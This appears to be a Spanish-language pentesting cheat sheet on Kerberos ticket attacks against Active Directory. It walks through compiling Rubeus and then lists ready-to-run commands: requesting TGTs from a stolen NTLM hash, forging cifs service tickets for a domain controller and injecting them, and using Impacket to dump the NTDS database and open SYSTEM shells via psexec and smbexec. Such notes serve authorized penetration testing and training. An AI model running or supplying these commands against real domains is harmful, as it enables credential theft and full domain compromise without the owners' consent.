# ASK-TGT / TGS 

Tags: #AD #TGT #TGS 

```powershell 
❯ klist     # Mirar los tickets que se tienen en la sesión 
```

## Rubeus - Windows 

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Visual Studio 2026](https://visualstudio.microsoft.com/es/downloads/)

Para instalar la herramienta se debe de compilar en 'Visual Studio' en el Windows a utilizar:
1. Descargar el .zip del código desde la url anterior y descomprimirlo
2. Iniciar la instalación de Visual Studio 
	- En la pestaña de los componentes... seleccionar 'Desarrollo de escritorio .NET' y dar click en instalar 
	- Escoger 'Abrir un proyecto o una solución' y seleccionar el archivo 'Rubeus' 
	- Actualizar el destino a .NET Framework 4.8 y dar click en 'continuar' 
3. En Visual Studio seleccionar el fichero raiz 'Rubeus'
4. Ir a la pestaña 'compilar' y dar click en 'Compilar Rubeus'

```bash 
# Utilizar Rubeus en Windows 
❯ .\Rubeus.exe -h     # Menú de ayuda 

# Ejecutar como usuario del dominio sin privilegios para obtener el TGT y la clave de sesión 
❯ .\Rubeus.exe asktgt /domain:domain1 /user:administrator /rc4:a87f3a337d73085c45f9516be5787d85


# Solicitar un TGS a nombre del usuario administrador 
❯ .\Rubeus.exe asktgs /ticket:TGT+Clave /service:cifs/DC01.domain1
	# ticket = Es el resultado del comando anterior donde se solicitó el TGT + clave 
	# Service = Servicio a consumir y en que máquina 


# Importar el ticker del servicio solicitado con un usuario del dominio sin privilegios 
❯ .\Rubeus.exe ptt /ticket:TGS   
	# ticket = Es el recultado del comando anterior al solicitar un TGS en nombre del usuario administrador 
```

## Impacket - Kali

```bash 
# Hash NTLM del usuario 'admin' para obtener el TGT+clave y se guarda en 'administrator.ccache'
❯ impacket-getTGT domain1/administrator -hashes :a87f3a337d73085c45f9516be5787d85  
```

```bash 
❯ export KRB5CCNAME=/home/kali/administrator.ccache   # Agregar el TGT a la variable 

# Dumpear la base NTDS de la máquina 'DC01' en nombre del usuario 'administrator' 
❯ impacket-secretsdump domain1/administrator@DC01.domain1 -k -no-pass  
	# k = Indicar la autenticación con Kerberos 
	# no-pass = Indicar que no se le indicará la password 

# Obtener un cmd con permisos de 'nt authority\system'
❯ impacket-psexec domain1/administrator@DC01.domain1 -k -no-pass 
❯ impacket-smbexec domain1/administrator@DC01.domain1 -k -no-pass 
```

```bash 
# Solicitar un ticket a nombre del user administrador que se guarda en 'administrator.ccache' 
❯ impacket-getST -spn cifs/DC01.domain1 -k -no-pass domain1/administrator
```